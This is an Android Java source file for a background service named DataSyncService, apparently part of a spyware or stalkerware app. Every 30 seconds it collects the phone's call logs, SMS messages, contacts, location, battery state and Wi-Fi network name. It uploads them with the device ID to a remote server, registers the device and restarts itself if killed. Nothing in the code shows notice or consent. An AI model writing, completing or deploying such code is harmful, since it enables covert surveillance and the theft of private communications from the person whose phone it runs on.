package com.ultimate.access.network;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;

import com.ultimate.access.collectors.*;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class DataSyncService extends Service {

    private static final String TAG = "DataSyncService";
    private ScheduledExecutorService scheduler;
    private String deviceId;

    // Collectors
    private LocationCollector locationCollector;
    private CallLogCollector callLogCollector;
    private SmsCollector smsCollector;
    private ContactCollector contactCollector;
    private AppUsageCollector appUsageCollector;
    private BatteryCollector batteryCollector;
    private NetworkCollector networkCollector;

    @Override
    public void onCreate() {
        super.onCreate();

        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // Initialize collectors
        locationCollector = new LocationCollector(this);
        callLogCollector = new CallLogCollector(this);
        smsCollector = new SmsCollector(this);
        contactCollector = new ContactCollector(this);
        appUsageCollector = new AppUsageCollector(this);
        batteryCollector = new BatteryCollector(this);
        networkCollector = new NetworkCollector(this);

        locationCollector.startCollection();
        startScheduler();
        registerDevice();

        Log.d(TAG, "DataSyncService started");
    }

    private void startScheduler() {
        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(this::syncAllData, 10, 30, TimeUnit.SECONDS);
    }

    private void syncAllData() {
        Map<String, Object> syncData = new HashMap<>();
        syncData.put("deviceId", deviceId);

        Map<String, Object> data = new HashMap<>();
        data.put("callLogs", callLogCollector.getCallLogs());
        data.put("sms", smsCollector.getSmsMessages());
        data.put("contacts", contactCollector.getContacts());

        Map<String, Object> battery = new HashMap<>();
        battery.put("level", batteryCollector.getBatteryLevel());
        battery.put("status", batteryCollector.getBatteryStatus());
        battery.put("temperature", batteryCollector.getBatteryTemperature());
        data.put("battery", battery);

        Map<String, Object> network = new HashMap<>();
        network.put("networkType", networkCollector.getNetworkType());
        network.put("wifiSSID", networkCollector.getWifiSSID());
        data.put("network", network);

        syncData.put("data", data);

        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        apiService.syncBulkData(syncData).enqueue(new retrofit2.Callback<ApiService.ServerResponse>() {
            @Override
            public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
                                   retrofit2.Response<ApiService.ServerResponse> response) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Sync successful");
                }
            }

            @Override
            public void onFailure(retrofit2.Call<ApiService.ServerResponse> call, Throwable t) {
                Log.e(TAG, "Sync failed: " + t.getMessage());
            }
        });
    }

    private void registerDevice() {
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("deviceId", deviceId);
        deviceInfo.put("deviceName", Build.MODEL);
        deviceInfo.put("manufacturer", Build.MANUFACTURER);
        deviceInfo.put("model", Build.MODEL);
        deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
        deviceInfo.put("sdkVersion", Build.VERSION.SDK_INT);

        ApiService apiService = ApiClient.getClient().create(ApiService.class);
        apiService.registerDevice(deviceInfo).enqueue(new retrofit2.Callback<ApiService.ServerResponse>() {
            @Override
            public void onResponse(retrofit2.Call<ApiService.ServerResponse> call,
                                   retrofit2.Response<ApiService.ServerResponse> response) {
                Log.d(TAG, "Device registered");
            }

            @Override
            public void onFailure(retrofit2.Call<ApiService.ServerResponse> call, Throwable t) {
                Log.e(TAG, "Registration failed: " + t.getMessage());
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (locationCollector != null) locationCollector.stopCollection();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}